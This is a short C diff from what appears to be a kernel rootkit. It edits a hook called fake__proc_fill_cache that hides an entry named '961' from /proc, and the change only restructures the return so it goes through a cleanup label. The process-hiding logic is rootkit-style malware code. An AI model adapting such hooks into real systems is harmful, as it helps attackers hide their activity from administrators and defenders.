@@ -65,7 +65,8 @@ bool fake__proc_fill_cache( struct file *file,
 
     if (strcmp(name, "961") == 0)
     {
-        return true;
+        ret = true;
+        goto gtfo;
     }
 
     child = d_hash_and_lookup(dir, &qname);
